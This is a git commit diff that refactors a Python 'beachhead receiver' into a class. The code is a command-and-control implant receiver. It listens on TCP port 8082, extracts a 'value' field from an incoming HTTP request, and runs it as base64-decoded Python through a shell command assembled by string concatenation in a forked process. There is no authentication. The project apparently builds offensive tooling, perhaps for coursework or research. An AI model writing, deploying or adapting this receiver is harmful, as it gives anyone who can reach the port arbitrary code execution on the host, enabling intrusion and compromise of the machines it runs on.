145aa199be656aacb2956fc5bd152a9399163a8f
Jeremy Dunn <jeremydunn@umass.edu>
2023-05-09 21:45:27 +0000

    Reconfigure beachhead receiver into class
    Works better with other beachhead files, plus provides consistency.

--- beachhead/BeachheadReceiver.py
+++ beachhead/BeachheadReceiver.py
@@ -4,46 +4,48 @@ from base64 import b64decode
 import subprocess
 import os
 
-HOST = ''
-PORT = 8082
 
-def accept_connection():
-    # Create a TCP/IP socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class BeachheadReceiver:
+    HOST = ''
+    PORT = 8082
+    
+    def __init__(self):
+        pass
 
-    sock.bind((HOST, PORT))
-    sock.listen(1)
+    def accept_connection(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind((self.HOST, self.PORT))
+        sock.listen(1)
+        conn, addr = sock.accept()
 
-    conn, addr = sock.accept()
+        data = b''
+        while True:
+            data_in = conn.recv(1024)
+            data += data_in
+            if len(data_in) < 1024:
+                break
+        sock.close()
 
-    data = b''
-    while True:
-        data_in = conn.recv(1024)
-        data += data_in
-        if len(data_in) < 1024:
-            break
-    sock.close()
+        return data
 
-    return data
+    def parse_cnc(self, data):
+        data = data.decode('utf-8')
+        data = data.split('\r\n\r\n')
+        data = data[1].split('&')
+        for d in data:
+            if 'value' in d:
+                d = d.split('=', 1)
+                return urllib.parse.unquote(d[1])
 
-
-def parse_cnc(data):
-    data = data.decode('utf-8')
-    data = data.split('\r\n\r\n')
-    data = data[1].split('&')
-    for d in data:
-        if 'value' in d:
-            d = d.split('=', 1)
-            return urllib.parse.unquote(d[1])
-
-
-def execute_cnc(implant):
-    command = "echo " + implant + " | base64 -d | xargs python3 -c"
-    pid = os.fork()
-    if pid == 0:
-        subprocess.Popen(command, shell=True)
+    def execute_cnc(self, implant):
+        command = "echo " + implant + " | base64 -d | xargs python3 -c"
+        pid = os.fork()
+        if pid == 0:
+            subprocess.Popen(command, shell=True)
 
 
-data = accept_connection()
-cnc = parse_cnc(data)
-execute_cnc(cnc)
+if __name__ == "__main__":
+    receiver = BeachheadReceiver()
+    data = receiver.accept_connection()
+    implant = receiver.parse_cnc(data)
+    receiver.execute_cnc(implant)
